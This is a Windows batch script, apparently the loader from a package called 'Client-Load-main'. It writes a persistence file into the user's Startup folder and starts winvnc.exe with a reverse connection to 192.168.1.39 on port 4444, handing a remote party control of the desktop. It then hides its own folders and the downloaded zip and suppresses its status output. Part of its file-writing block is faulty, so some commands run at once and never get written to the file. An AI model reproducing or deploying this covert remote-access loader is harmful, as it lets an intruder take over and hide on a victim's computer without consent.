@echo off

timeout /t 2 >nul

REM Determine the directory where this batch file is located
set "script_dir=%~dp0"

REM Create the batch file for startup folder (startup_winvnc.bat)
(
  echo @echo off
  echo timeout /t 3 >nul  REM Wait 3 seconds for computer startup
  echo cd /d "%~dp0"
  echo call "%~dp0run_winvnc.bat"
) > "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\startup_winvnc.bat"

REM Create the batch file to run winvnc.exe (run_winvnc.bat)
(
  echo @echo off
  echo REM Kill all instances of winvnc.exe
  taskkill /f /im winvnc.exe >nul 2>&1
  timeout /t 1 >nul
  start winvnc.exe -run
  timeout /t 1 >nul
  winvnc.exe -connect 192.168.1.39::4444
) > "%script_dir%run_winvnc.bat"

REM Check if both batch files exist in their respective locations
if exist "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\startup_winvnc.bat" (
  >nul echo startup_winvnc.bat created successfully in Startup folder.
) else (
  >nul echo Failed to create startup_winvnc.bat in Startup folder.
)

if exist "%script_dir%run_winvnc.bat" (
  >nul echo run_winvnc.bat created successfully in current directory.
) else (
  >nul echo Failed to create run_winvnc.bat in current directory.
)

REM Hide the extracted Client-load folder and its parent folder
attrib +h "%script_dir%\.."
attrib +h "%script_dir%\..\.."

REM Hide the Client-Load-main.zip file in the Downloads directory
attrib +h "%USERPROFILE%\Downloads\Client-Load-main.zip"

REM Start winvnc.exe for the first time and wait for 12 seconds
start "" "%script_dir%winvnc.exe"
timeout /t 12 >nul

REM Attempt to kill winvnc.exe if it is running
taskkill /f /im winvnc.exe >nul 2>&1

REM After waiting, call run_winvnc.bat
call "%script_dir%run_winvnc.bat"

REM End of main.bat
